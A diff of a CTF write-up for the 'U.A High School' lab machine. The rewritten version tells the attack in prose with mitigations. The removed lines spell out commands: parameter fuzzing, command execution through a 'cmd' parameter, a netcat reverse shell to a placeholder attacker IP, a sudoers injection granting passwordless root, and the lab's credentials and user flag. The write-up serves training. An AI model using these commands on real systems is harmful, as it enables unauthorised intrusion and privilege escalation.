@@ -7,150 +7,73 @@
 ---
 
 ## 🔍 Challenge Overview
-The challenge involved a vulnerable PHP web application with a hidden command execution feature.  
-Through enumeration and exploitation, we obtained a reverse shell, escalated privileges using insecure script evaluation, and finally gained root access.  
+The U.A High School CTF was a web-based challenge combined with Linux privilege escalation.  
+The goal was to start from a vulnerable PHP application, gain access to the system, and then escalate to root.  
+The challenge tested skills in **enumeration, remote code execution, steganography, credential hunting, and privilege escalation through unsafe scripting practices**.
 
 ---
 
-## ⚔️ Walkthrough
+## ⚔️ My Approach
 
 ### 1. Reconnaissance
-- Performed an initial scan with **nmap**:
+I began with **nmap scanning**, which revealed two key services running on the target:  
+- **SSH (22)**  
+- **Apache Web Server (80)**  
 
-```bash
-nmap -sC -sV 10.10.26.57
-Findings:
+This indicated that initial access was most likely through the web service.
 
-22/tcp → OpenSSH 8.2p1 (Ubuntu)
+---
 
-80/tcp → Apache httpd 2.4.41 (Ubuntu)
+### 2. Web Enumeration
+Using tools like **feroxbuster** and **ffuf**, I discovered hidden pages.  
+One interesting file (`/assets/index.php`) had a parameter called `cmd`.  
+Testing this showed that it directly executed system commands, which confirmed a **Remote Code Execution (RCE)** vulnerability.
 
-2. Enumeration
-Discovered /assets/index.php using feroxbuster.
+---
 
-Used ffuf to fuzz parameters:
+### 3. Exploitation
+I leveraged the vulnerable `cmd` parameter to run system commands remotely.  
+With this access, I delivered a **reverse shell payload** and caught it on my machine, gaining a low-privilege shell as the `www-data` user.
 
-bash
-Copy
-Edit
-ffuf -u 'http://10.10.x.x/assets/index.php?FUZZ=id' \
-     -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
-Found parameter cmd → enabled command execution.
+---
 
-3. Exploitation – Command Execution
-Tested with:
+### 4. Looting & Hidden Files
+Once inside, I explored the system and found hidden content left behind by the challenge creator.  
+There were files that contained a base64-encoded passphrase and images with **steganography**.  
+By extracting the hidden data from the images, I was able to recover valid credentials for the `deku` user.  
+Using these, I logged into the target via SSH and obtained the **user flag**.
 
-http
-Copy
-Edit
-http://10.10.x.x/assets/index.php?cmd=id
-Response (base64 decoded):
+---
 
-kotlin
-Copy
-Edit
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-Confirmed working with commands: whoami, which nc.
+### 5. Privilege Escalation
+After gaining user access, I checked for privilege escalation vectors.  
+A custom script was discovered in `/opt/NewComponent/feedback.sh`.  
+Although it had some filtering in place, it still used **`eval`**, which is unsafe because it executes input as code.  
 
-4. Reverse Shell
-Crafted reverse shell payload:
+By injecting malicious input, I modified the sudoers file, which granted me **full sudo access without a password**.  
+From there, I escalated to a root shell and retrieved the **root flag**.
 
-bash
-Copy
-Edit
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 1234 >/tmp/f
-Started listener:
+---
 
-bash
-Copy
-Edit
-nc -lvnp 1234
-Triggered payload via cmd parameter → gained shell as www-data.
+## 🎯 Key Learnings
+- Enumeration is the foundation: thorough scanning uncovered the RCE entry point.  
+- Even harmless-looking scripts can be dangerous if they use insecure practices like `eval`.  
+- Sensitive information should never be hidden in files (like images with steganography).  
+- The principle of least privilege must always be followed, otherwise attackers can easily escalate privileges.  
 
-Stabilized shell:
+---
 
-bash
-Copy
-Edit
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-5. Looting & Hidden Files
-Found /var/www/Hidden_Content/passphrase.txt → Base64 encoded string:
+## 🛡️ Mitigation
+If this had been a real system:  
+- **Sanitize and validate inputs** strictly, never allowing raw execution through query parameters.  
+- Avoid using **`eval`** or similar functions in scripts handling user input.  
+- Do not leave sensitive credentials hidden in files or images.  
+- Restrict sudo permissions to the absolute minimum required.  
 
-ini
-Copy
-Edit
-QWxsbWlnaHRGb3JFdmVyISEhCg==
-Decoded → AllmightForEver!!!
+---
 
-Downloaded hidden images (oneforall.jpg, yuei.jpg) using wget.
-
-Corrected file header using hex editor.
-
-Extracted hidden data with steghide:
-
-bash
-Copy
-Edit
-steghide extract -sf oneforall.jpg
-Obtained credentials:
-
-makefile
-Copy
-Edit
-deku:One?For?All_!!one1/A
-6. User Access
-Logged in via SSH with deku credentials.
-
-Found user flag:
-
-ruby
-Copy
-Edit
-THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
-7. Privilege Escalation
-Checked sudo privileges:
-
-bash
-Copy
-Edit
-sudo -l
-Found writable script: /opt/NewComponent/feedback.sh.
-
-Script filtered dangerous characters but still used eval, allowing injection.
-
-Exploited by injecting:
-
-ruby
-Copy
-Edit
-deku ALL =NOPASSWD:ALL >> /etc/sudoers
-This gave NOPASSWD:ALL sudo access.
-
-Gained root shell:
-
-bash
-Copy
-Edit
-sudo /bin/bash
-Retrieved root flag:
-
-php-template
-Copy
-Edit
-<root.txt contents>
-🎯 Impact
-Remote Code Execution (RCE) via unsanitized cmd parameter.
-
-Sensitive credentials hidden with steganography.
-
-Privilege escalation through unsafe eval in bash script.
-
-🛡️ Mitigation
-Never use eval for handling user input.
-
-Implement strict input validation & sanitization.
-
-Restrict access to hidden files & remove credentials from images.
-
-Apply principle of least privilege for sudo rules.
-
+## ✅ Outcome
+I successfully exploited the U.A High School machine by chaining:  
+- Remote Code Execution via an insecure PHP parameter,  
+- Steganography for hidden credentials, and  
+- Privilege escalation through unsafe script evaluation. 
